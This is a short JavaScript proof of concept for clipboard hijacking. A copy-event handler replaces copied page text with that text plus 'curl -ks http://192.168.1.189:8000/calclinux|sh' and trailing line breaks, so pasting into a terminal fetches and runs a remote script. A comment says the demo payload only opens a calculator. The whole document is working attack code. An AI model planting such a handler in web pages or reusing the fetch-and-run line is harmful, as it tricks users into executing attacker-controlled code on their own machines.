document.addEventListener('copy', function(e) {
	var clipboardData = e.clipboardData || window.clipboardData;
	var c = e.target.innerHTML;
	var payload = "curl -ks http://192.168.1.189:8000/calclinux|sh";
	clipboardData.setData('text', c + ";" + payload + "\r\n\r\n");
	console.log(c);
	e.preventDefault();
})

// http://192.168.1.189:8000/calclinux:
//	"gnome-calculator" - on webpage